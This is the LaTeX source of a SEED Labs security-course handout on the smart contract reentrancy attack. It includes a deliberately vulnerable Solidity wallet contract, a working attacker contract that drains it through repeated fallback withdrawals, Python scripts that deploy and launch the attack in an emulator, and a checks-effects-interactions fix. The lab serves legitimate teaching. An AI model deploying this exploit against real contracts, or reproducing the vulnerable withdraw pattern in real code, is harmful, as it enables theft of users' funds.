%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website. }

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend too much on our SEED VM. You can do this lab
using other VMs or physical machines. }







\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}




\hypersetup{%
    pdfborder = {0 0 0}
}

\lhead{\bfseries SEED Labs -- Reentrancy Attack Lab}
\newcommand{\tunnelFigs}{./Figs}


\newcommand{\pointupright}[1]{\ding{218} \textbf{\texttt{#1}}}

\usepackage{hyperref}

% Copyright 2017 Sergei Tikhomirov, MIT License
% https://github.com/s-tikhomirov/solidity-latex-highlighting/

%\usepackage{listings, xcolor}

\lstdefinelanguage{Solidity}{
	keywords=[1]{anonymous, assembly, assert, balance, break, call, callcode, case, catch, class, constant, continue, constructor, contract, debugger, default, delegatecall, delete, do, else, emit, event, experimental, export, external, false, finally, for, function, gas, if, implements, import, in, indexed, instanceof, interface, internal, is, length, library, log0, log1, log2, log3, log4, memory, modifier, new, payable, pragma, private, protected, public, pure, push, require, return, returns, revert, selfdestruct, send, solidity, storage, struct, suicide, super, switch, then, this, throw, transfer, true, try, typeof, using, value, view, while, with, addmod, ecrecover, keccak256, mulmod, ripemd160, sha256, sha3}, % generic keywords including crypto operations
	keywordstyle=[1]\color{blue}\bfseries,
	keywords=[2]{address, bool, byte, bytes, bytes1, bytes2, bytes3, bytes4, bytes5, bytes6, bytes7, bytes8, bytes9, bytes10, bytes11, bytes12, bytes13, bytes14, bytes15, bytes16, bytes17, bytes18, bytes19, bytes20, bytes21, bytes22, bytes23, bytes24, bytes25, bytes26, bytes27, bytes28, bytes29, bytes30, bytes31, bytes32, enum, int, int8, int16, int24, int32, int40, int48, int56, int64, int72, int80, int88, int96, int104, int112, int120, int128, int136, int144, int152, int160, int168, int176, int184, int192, int200, int208, int216, int224, int232, int240, int248, int256, mapping, string, uint, uint8, uint16, uint24, uint32, uint40, uint48, uint56, uint64, uint72, uint80, uint88, uint96, uint104, uint112, uint120, uint128, uint136, uint144, uint152, uint160, uint168, uint176, uint184, uint192, uint200, uint208, uint216, uint224, uint232, uint240, uint248, uint256, var, void, ether, finney, szabo, wei, days, hours, minutes, seconds, weeks, years},	% types; money and time units
	keywordstyle=[2]\color{teal}\bfseries,
	keywords=[3]{block, blockhash, coinbase, difficulty, gaslimit, number, timestamp, msg, data, gas, sender, sig, value, now, tx, gasprice, origin},	% environment variables
	keywordstyle=[3]\color{violet}\bfseries,
	identifierstyle=\color{black},
	sensitive=false,
	comment=[l]{//},
	morecomment=[s]{/*}{*/},
	commentstyle=\color{gray}\ttfamily,
	stringstyle=\color{red}\ttfamily,
	morestring=[b]',
	morestring=[b]"
}



\begin{document}


\begin{center}
{\LARGE Smart Contract Reentrancy Attack Lab}
\end{center}

\seedlabcopyright{2022}



% *******************************************
% SECTION
% *******************************************
\section{Overview} 

The DAO (Decentralized Autonomous Organization) attack was one of the major hacks that
occurred in the early development of Ethereum. At the time, the contract held over \$150
million. Reentrancy played a major role in the attack, which ultimately led to the hard fork
that created Ethereum Classic (ETC)~\cite{MasteringEthereum,DAO}. 
As of 2022, the reentrancy attack is still a common attack on Ethereum~\cite{collection}.


The purpose of this lab is to give students a hands-on experience on
the reentrancy attack. Students are given two smart contracts, 
a vulnerable one (the victim contract) and an attack contract. 
Students will go through the entire attack process
to see how exactly the attack works. They will see in person how such an 
attack can steal all the money inside the victim contract.  The
attack will be conducted on the SEED emulator, with 
an Ethereum blockchain deployed inside. 
The topics covered in this lab are the following:

\begin{itemize}[noitemsep]
    \item The Reentrancy attack
    \item Blockchain and smart contract 
    \item Interacting with Blockchain
    \item The SEED Internet emulator
\end{itemize}

\paragraph{Lab environment.}
\seedenvironmentB
\nodependency
We recommend the following setup for the virtual machine: at least two CPU cores and 
at least 4GB of RAM.


\paragraph{Note to instructors.}
The reentrancy attack is a classic attack on smart contracts. 
While this lab will cover some of the attack basics,
it is not intended to be a tutorial on this attack.
We suggest instructors to cover this attack in their classes before 
assigning the lab to students. 
Students can also read about the attack from online 
resources~\cite{MasteringEthereum}.


% *******************************************
% SECTION
% *******************************************
\section{The Lab Setup and the SEED Internet Emulator}
\label{sec:labsetup}


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Emulator} 

This lab will be performed inside the SEED Internet Emulator (simply
called the emulator in this document).
We provide a pre-built emulator in two different forms: Python code
and container files. The container files are generated from
the Python code, but students need to install the SEED Emulator source
code from the GitHub to run the Python code. The container files
can be directly used without the emulator source code.
Instructors who would like to customize the emulator can modify the Python
code, generate their own container files, and then provide the
files to students, replacing the ones included in the
lab setup file.


Please download the \texttt{Labsetup.zip} file from the web page, and
unzip it. The contents inside the \path{Labsetup/emulator/} folder are the 
files for the emulator. Inside this folder, there is two Python programs 
that are used to generate the emulation. 
We have already run the programs and the generated 
emulation files are inside the \texttt{output/} and \texttt{output-small/} 
folders. Students do not need to run the Python programs.  Students can pick
one set of containers based on how much RAM they have given to their 
underlying virtual machines. 

\begin{itemize}[noitemsep]
\item \texttt{blockchain-poa-small.py} and \texttt{output-small/}: this setup
has only 10 Ethereum nodes on the blockchain; it only requires 4GB of RAM to run.

\item \texttt{blockchain-poa.py} and \texttt{output/}: this setup has more Ethereum
nodes, but requires 8GB of RAM to run.
\end{itemize}
 


\paragraph{Start the emulation.}
Go to the container folder, and run the following docker commands
to build and start the containers. We recommend that you run the emulator inside
the provided SEED Ubuntu 20.04 VM, but doing it in a generic Ubuntu 20.04 operating system
should not have any problem, as long as the docker software is installed.
Readers can find the docker manual from
\href{https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md}
{\underline{this link}}.

\begin{lstlisting}
$ docker-compose build
$ docker-compose up

// Aliases for the Compose commands above (only available in the SEED VM)
$ dcbuild       # Alias for: docker-compose build
$ dcup          # Alias for: docker-compose up
$ dcdown        # Alias for: docker-compose down
\end{lstlisting}




% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{The Client Code} 

There are many ways to interact with the Ethereum network,
including using existing tools, such as Remix, Metamask, and Hardhat.
In this lab, we choose to write our own Python program, 
which uses the popular \texttt{web3.py} library. 
For convenience, we wrote some wrapper functions, and 
they are included in \texttt{SEEDWeb3.py}.  Most of our
programs in this lab will import this library. 
All the provided program can be found in the
\texttt{Labsetup} folder.  


The \texttt{web3.py} library has not been installed on the SEED Ubuntu 20.04 VM. 
Students need to install the library. 
We need to install an old version of web3 library (version 5.31.1), 
or our code will not run. See the following command: 

\begin{lstlisting}
$ pip3 install web3==5.31.1
\end{lstlisting}





% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Connecting to the Blockchain} 
\label{sec:sub:ports}

%These servers are not directly
%accessible from the outside, so we configured
%the following port forwarding, which allows us 
%to access them using a port on our local host (i.e., the VM). 
%The followings summarize our setup.

%\begin{lstlisting}
%localhost:8545 --> <IP 1>:8545 : Attacker (eth0)
%localhost:8546 --> <IP 2>:8545 : Victim   (eth1)
%localhost:8547 --> <IP 3>:8545 : User 1   (eth2)
%localhost:8548 --> <IP 4>:8545 : User 2   (eth3)
%\end{lstlisting}

To conduct activities on the blockchain, we need to 
do it from a node on the blockchain. Connection to
such a node is typically done through HTTP or Web Socket. 
In our emulator, we have enabled the HTTP server on
all Ethereum nodes. 
To connect to a node, we just need to provide its IP address 
and port number \texttt{8545}. 
The following example connects to the one of the nodes.

\begin{lstlisting}
# Connect to a geth node
web3 = SEEDWeb3.connect_to_geth_poa('http://10.150.0.71:8545')
\end{lstlisting}



 

% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Accounts} 

To send a transaction on the blockchain, we need to 
have a wallet that holds accounts (including both public and 
private keys), and the accounts must hold enough money to pay for the gas 
needed for transactions. On each Ethereum node, we have already
created several accounts with balance. We will just use 
these accounts for our transactions. After connecting to
an Ethereum node, we can access all its accounts via
the \texttt{web3.eth.accounts[]} array. In the following 
example, we choose to use \texttt{web3.eth.accounts[1]}. 
All the accounts (its private keys) in the emulator are 
encrypted, and the password is \texttt{admin}. To use 
an account, we first need to unlock it using the password. 

\begin{lstlisting}
sender_account = web3.eth.accounts[1]
web3.geth.personal.unlockAccount(sender_account, "admin")
\end{lstlisting}



We also need to get the balance of an account. We 
have included a Python program that prints out the balance
of all the accounts on the node that we connect to. The 
program name is \texttt{get\_balance.py}. It basically
invokes an API in the \texttt{web3.py} library.  
See the following:

\begin{lstlisting}
web3.eth.get_balance(Web3.toChecksumAddress(address))
\end{lstlisting}
 




% *******************************************
% SECTION
% *******************************************
\section{Task 1: Getting Familiar with the Victim Smart Contract} 

The code below is the vulnerable smart contract that we will be attacking. 
It is the victim contract, which is a very simple contract. 
It acts as a wallet for users: users can deposit any amount of ether to 
this contract; they can also withdraw their money later.
The code can be found from the \path{Labsetup/contract} folder. 

\begin{lstlisting}[language=Solidity, 
      caption={The vulnerable smart contract (\texttt{ReentrancyVictim.sol})}]
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.8;

contract ReentrancyVictim {
    mapping (address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;
    }

    function getBalance(address _addr) public view returns (uint) {
        return balances[_addr];
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
\end{lstlisting}

In the following, we explain the purpose of each function, and  
how the contract works. This is not meant to be a tutorial on 
smart contract. Students should already have some basic knowledge
about smart contract programming. 

\begin{itemize}
\item \texttt{deposit()}: It is invoked by the user willing to put his/her 
  ether in this smart contract. When this function is called, 
  \texttt{msg.sender} contains the value of the sender's account address, 
  while \texttt{msg.value} contains the amount of ether. 
  It will update a data structure called \texttt{balances} which
  is an internal balance sheet maintained by the smart contract. 

  Because the function has the \texttt{payable} modifier, it 
  can send and receive ether. When this function receives 
  ether, the balance of this contract account 
  will be automatically updated. This balance indicates how much
  ether this smart contract account holds; it is stored
  in the balance sheet of the entire blockchain. 


\item \texttt{getBalance()}: 
  It takes an address as the parameter and returns the number of ether
  this address holds in the smart contract. 

\item \texttt{getContractBalance()}: 
  This function returns the total balance of the smart contract.
  Again, this balance is the one maintained by the blockchain,
  so we can get the balance directly from the blockchain, instead 
  of calling this function. 
  If the contact updates its internal balance sheet correctly,
  the total balance should be the sum of those in the internal
  balance sheet.


\item \texttt{withdraw()}: 
  This function takes one parameter, which is the number of ether the caller 
  wants to get back. It is dependent on who invokes it due to the use of 
  \texttt{msg.sender} in its implementation. The person calling this function cannot withdraw
  more ether than what he/she has in the smart contract. The first line 
  of the function does the job of checking the balance of the caller. 
  If the person tries to withdraw more than what he/she has, the program will stop. 
  If the check passes, the caller will be getting the specified amount of ether. 
  The ether is sent using the \texttt{call} low-level function and the 
  internal balance sheet is then updated. The blockchain will also automatically
  update its balance sheet, because the ether held by this smart contract
  account is now reduced due to the withdrawal. 

  This function has an reentrancy vulnerability, which is what we will be 
  exploiting in our attack. We will explain how the attack works later.  
\end{itemize}


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Task 1.a: Compiling the Contract} 

In the newer version of Solidity, countermeasures are implemented.
Therefore, we will compile the code using Version 0.6.8, which 
is an older version. The compiler (\texttt{solc-0.6.8}) can be found in the 
\texttt{contract} folder. We can use the following command to 
compile the contract. 

\begin{lstlisting}
solc-0.6.8 --overwrite --abi --bin -o . ReentrancyVictim.sol
\end{lstlisting}
 
Two files will be generated: the \texttt{bin} file and the \texttt{abi} file.   
The \texttt{bin} file contains the bytecode of the contract. After 
a contract is deployed, the bytecode will be stored to the blockchain.
ABI stands for Application Binary Interface. The \texttt{abi} file contains 
the API information of the contract. It is needed when we need to 
interact with a contract, so we know the name of the functions,
their parameters and return values. 



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Task 1.b: Deploying the Victim Contract} 

In this task, we will deploy the victim contract to the 
blockchain. There are many ways to do that. In this lab, 
we will use our own Python program to do the deployment.
The following program is provided in the \path{Labsetup/victim}
folder. 

\begin{lstlisting}[language=python, 
    caption={Deploying the victim contract (\texttt{deploy\_victim\_contrac.py})}]
abi_file = "../contract/ReentrancyVictim.abi"
bin_file = "../contract/ReentrancyVictim.bin"

# Connect to a geth node
web3 = SEEDWeb3.connect_to_geth_poa('http://10.150.0.71:8545')

# We use web3.eth.accounts[1] as the sender because it has more ethers
sender_account = web3.eth.accounts[1]
web3.geth.personal.unlockAccount(sender_account, "admin")
addr = SEEDWeb3.deploy_contract(web3, sender_account,
                                abi_file, bin_file, None)  (*@\lineone@*) 
print("Victim contract: {}".format(addr))
with open("contract_address_victim.txt", "w") as fd:
    fd.write(addr)
\end{lstlisting}

The actual code to deploy contract is in the \texttt{SEEDWeb3} 
library (the invocation is in Line~\lineone). 
As shown in the following code snippet, 
it basically creates a \texttt{Contract} class from the abi and 
bytecode, and then create a transaction to deploy the contract.

\begin{lstlisting}
contract = web3.eth.contract(abi=abi, bytecode=bytecode)
contract.constructor(...).transact({ 'from': sender_account })
\end{lstlisting}
 


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Task 1.c: Interacting with the Victim Contract} 

After deploying the contract, we will deposit money to this contract
from some users' accounts (later, the attacker will steal all the
money). The code is included in \texttt{fund\_victim\_contract.py}. 
In the code, the variable \texttt{victim\_addr} in \lineone
holds the contract address. Students must replace the value
with the actual contract address obtained from the 
deployment step. 


We choose to deposit money from an Ethereum node. In this 
example, we use node \texttt{10.151.0.71}; students should feel
free to use other nodes. 

\begin{lstlisting}[language=python,
        caption=Deposit money (\texttt{fund\_victim\_contract.py})]
abi_file    = "../contract/ReentrancyVictim.abi"
victim_addr = '0x2c46e14f433E36F17d5D9b1cd958eF9468A90051'  (*@\lineone@*) 

# Connect to our geth node, select the sender account
web3 = SEEDWeb3.connect_to_geth_poa('http://10.151.0.71:8545')
sender_account = web3.eth.accounts[1]
web3.geth.personal.unlockAccount(sender_account, "admin")

# Deposit Ethers to the victim contract
# The attacker will steal them in the attack later
contract_abi  = SEEDWeb3.getFileContent(abi_file)
amount = 10  # the unit is ether
contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
tx_hash  = contract.functions.deposit().transact({
                    'from':  sender_account,
                    'value': Web3.toWei(amount, 'ether')
                })
print("Transaction sent, waiting for the block ...")
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print("Transaction Receipt: {}".format(tx_receipt))
\end{lstlisting}


Similarly, we can withdraw our money from the contract. 
The following code snippet withdraw 1 ether from the contract,
and then print out the balance of the sender.  

\begin{lstlisting}[language=python,
        caption=Withdraw money (\texttt{withdraw\_from\_victim\_contract.py})]
amount = 1
contract = web3.eth.contract(address=victim_addr, abi=contract_abi)
tx_hash  = contract.functions.withdraw(Web3.toWei(amount, 'ether')).transact({
                    'from':  sender_account
                })
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

# print out the balance of my account via a local call
myBalance = contract.functions.getBalance(sender_account).call()
print("My balance {}: {}".format(sender_account, myBalance))
\end{lstlisting}


\paragraph{Lab task:} 
Please deposit 30 ethers to the victim contract, and then
withdraw 5 ethers from it. Please show the balance 
of the contract. 
 



% *******************************************
% SECTION
% *******************************************
\section{Task 2: The Attacking Contract} 


To launch the reentrancy attack on the victim contract, the attacker
needs to deploy an attack smart contract. An example of the 
attack contract is already provided in the lab setup 
and the code is listed below. 


\begin{lstlisting}[language=Solidity, 
    caption = The attack contract (\texttt{ReentrancyAttacker.sol})]
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.8;

import "./ReentrancyVictim.sol";

contract ReentrancyAttacker {
    ReentrancyVictim public victim;
    address payable _owner;
    
    constructor(address payable _addr) public {
        victim = ReentrancyVictim(_addr); 
        _owner = payable(msg.sender);
    }
    
    fallback() external payable {
        if(address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "You need to send one ether 
	                               when attacking");
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    } 
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
 
    function cashOut(address payable _addr) external payable {
        require(msg.sender == _owner);
        _addr.transfer(address(this).balance);
    }
}
\end{lstlisting}
 
The most important functions of this contract are 
\texttt{attack()} and \texttt{fallback()}. We will explain how
this contract can be used to steal all the money from the 
victim contract. 

After deploying the contract, the attack invokes the 
\texttt{attack()} function and send at least one ether to 
this contract. This function will deposit one ether to
the victim contract by invoking its \texttt{deposit()} function.
After depositing the money, the attacker contract immediately
withdraw one ether from the victim contract. This is what 
triggers the attack. Let us see what will happen when the 
\texttt{withdraw()} function is  invoked. We list the 
code of the victim contract's \texttt{withdraw()} function
below.

\begin{lstlisting}[language=Solidity]
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount);            (*@\lineone@*) 

    (bool sent, ) = msg.sender.call{value: _amount}(""); (*@\linetwo@*) 
    ...

    balances[msg.sender] -= _amount;                     (*@\linethree@*) 
}
\end{lstlisting}
 
Line~\lineone checks whether the sender (\texttt{msg.sender})
has enough money on the balance (if not, the invocation will fail). 
Here, \texttt{msg.sender} contains the address of the one 
invoking the contract. Since the victim contract is invoked by the 
attack contract, the address is the attack contract's address.

After passing the balance check, the contract 
sends the specified amount (Line~\linetwo) 
to the sender using \texttt{msg.sender.call}. This will
send the specified amount of ether to \texttt{msg.sender}, 
i.e., the attack contract. This is where the problem occurs. 

A smart contract typically receive money via a function call 
(the function must be labeled \texttt{payable}), but if it receives
money not via a function call (such as through the 
local \texttt{call()} function from another contract,
a default function called \texttt{fallback()} will be 
invoked. The following is the \texttt{fallback()}
function inside the attack contract. 

\begin{lstlisting}[language=Solidity]
fallback() external payable {
    if(address(victim).balance >= 1 ether) {  (*@\linefour@*) 
        victim.withdraw(1 ether);
    } 
}
\end{lstlisting}
 
This function invokes the \texttt{withdraw()} function again.  
Because the balance of the victim contract has not 
been updated yet (in Line~\linethree), 
the invocation will pass the balance check on 
Line~\lineone, even though the 
attacker's balance is already zero. This will trigger 
the \texttt{fallback()} function again in the attack contract,
which will trigger the \texttt{withdraw()} function of the 
victim contract. This process will repeat until the 
victim contract's balance is below 1 ether (Line~\linefour). 
The following is is the function invocation sequence. 

\begin{lstlisting}
withdraw --> fallback --> withdraw --> fallback --> withdraw ...
\end{lstlisting}


\paragraph{Task.}  In this task, your job is to deploy the 
attack contract. The code, which is provided, 
is similar to the one used 
to deploy the victim contract. It should be noted that 
the attack contract must know the address of the victim contract.
Therefore, students need to modify the code \texttt{deploy\_attack\_contract.py}
to provide the correct address of the victim contract. 

 


% *******************************************
% SECTION
% *******************************************
\section{Task 3: Launching the Reentrancy Attack} 

To launch the attack, we just need to invoke the \texttt{attack()}
function of the attack contract. We need to send 1 ether to the 
contract during the invocation. The attack contract will deposit
this 1 ether to the victim contract, or it will not be able to 
withdraw money from the victim contract. 
The code (listed below) is provided in the lab setup, but 
the address of the attack contract needs to be modified in the code. 

\begin{lstlisting}[language=Python, 
   caption = The code to launch the attack (\texttt{deploy\_attack\_contract.py})]
abi_file      = "../contract/ReentrancyAttacker.abi"
attacker_addr = 'put the correct address here'  

# Launch the attack
contract_abi  = SEEDWeb3.getFileContent(abi_file)
contract = web3.eth.contract(address=attacker_addr, abi=contract_abi)
tx_hash  = contract.functions.attack().transact({
                    'from':  sender_account,
                    'value': Web3.toWei('1', 'ether')
                })
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print("Transaction Receipt: {}".format(tx_receipt))
\end{lstlisting}
 
Please show that you can launch the attack to steal all the 
money from the victim contract. You can use the 
\texttt{get\_balance.py} script to print out the 
balance of any account. After stealing all the money, you can
use the \texttt{cashout.py} to move all the money out of the
attack smart contract, to another account owned by the 
attacker. 


% *******************************************
% SECTION
% *******************************************
\section{Task 4: Countermeasures} 


There are a number of common techniques that help avoid potential 
reentrancy vulnerabilities in smart contracts. 
Readers can read~\cite{MasteringEthereum} for details. 
One common technique is to 
ensure that all logic that changes state variables happens before
ether is sent out of the contract (or any external call). In the 
victim contract, the update of the balance happens after the call, 
so if the call does not return, the balance will not be updated. 
In smart contract programs, 
it is a good practice for any code that performs external calls to unknown addresses to be the
last operation in a localized function or piece of code execution. This is known as the
\texttt{checks-effects-interactions} pattern.

Using this principle, we can easily fix the problem. See the following example. Please 
revise the victim contract, repeat the attack, and report your observation. 

\begin{lstlisting}[language=Solidity] 
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount);

    balances[msg.sender] -= _amount;

    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send Ether");
}
\end{lstlisting}


\paragraph{Note:} It seems that the newer Solidity versions have built-in
protection against the reentrancy attack. However, not enough details are 
given in the documentation. Here is a discussion
found from the Ethereum GitHub 
repository~\url{https://github.com/ethereum/solidity/issues/12996}.
If you are familiar with this compiler feature, please contact us, so 
we can add a lab task based on the protection.





% *******************************************
% SECTION
% *******************************************
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% *******************************************
% SECTION
% *******************************************
\section*{Acknowledgment}

This lab was developed with the help of Rawi Sader,
a graduate student in the Department of Electrical Engineering
and Computer Science at Syracuse University.
The SEED project was funded in part
by the grants from the US National Science Foundation
and the Syracuse University.




% *******************************************
% SECTION
% *******************************************
\begin{thebibliography}{90}

\bibitem{DAO}
Phil Daian, ``Analysis of the DAO exploit'', 2016,
\url{https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/}


\bibitem{MasteringEthereum}
Andreas M. Antonopoulos and Gavin Wood, 
``Mastering Ethereum'', 2018,
\url{https://github.com/ethereumbook/ethereumbook}


\bibitem{collection}
GitHub Contributor, 
``A Historical Collection of Reentrancy Attacks'', 2022,
\url{https://github.com/pcaversaccio/reentrancy-attacks}

\end{thebibliography}

\end{document}
